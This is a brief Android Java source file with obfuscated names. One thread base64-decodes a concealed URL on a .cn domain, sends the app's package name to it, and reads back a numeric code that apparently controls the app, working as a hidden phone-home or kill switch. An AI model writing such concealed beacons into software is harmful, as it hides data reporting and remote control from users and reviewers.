package l;

import java.io.*;
import java.net.*;
import android.widget.*;
import android.content.*;
import android.os.*;
import java.util.*;

public class t extends Thread
{
	Context c;
	Handler h;
	int i;

	t(Context c,Handler h)
	{
		this.c=c;
		this.h=h;
	}

	t h(Handler h)
	{
		this.h=h;
		return null;
	}
	
	@Override
	public void run()
	{
		String s;
		s="aHR0cDovL2Rqd2RqLmNuLy0vbC5waHA/bD0";
		s = new String(android.util.Base64.decode(s, android.util.Base64.DEFAULT));
		s=new StringBuilder(s).append(c.getPackageName()).toString();

		//s="http://www.ooowww.ooo/l.php";
		try
		{
			HttpURLConnection con=(HttpURLConnection) new URL(s).openConnection();
			InputStream is = con.getInputStream();
			byte[] b = new byte[3];
			s=new String(b, 0,is.read(b));
			i=new Integer(s);
		}
		catch(Exception e)
		{
			i=-1;
		}
		Message m=Message.obtain();
		//m.what=1;
		m.obj=i;
		h.sendMessage(m);

		super.run();
	}


}
